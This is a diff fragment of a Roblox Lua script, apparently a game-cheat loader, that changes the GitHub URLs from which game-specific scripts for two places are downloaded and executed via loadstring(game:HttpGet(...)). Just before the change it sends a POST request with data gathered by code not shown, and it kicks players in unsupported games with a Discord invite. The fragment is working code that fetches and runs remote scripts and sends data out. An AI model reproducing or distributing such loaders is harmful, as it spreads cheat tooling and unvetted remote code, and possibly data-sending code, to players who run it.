@@ -65,9 +65,9 @@ local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
 
   if game.PlaceId == 286090429 then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/anldn/x/main/scripts/arsentten.html"))();
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/KaitoHub/KaitoHUB/main/scripts/arsentten.html"))();
 elseif game.PlaceId == 6407649031 then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/anldn/x/main/scripts/noscopetten.html"))();
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/KaitoHub/KaitoHUB/main/scripts/noscopetten.html"))();
 else
     game.Players.LocalPlayer:Kick("This game is not supported | discord.gg/Hef2UG4FJZ")    
 end
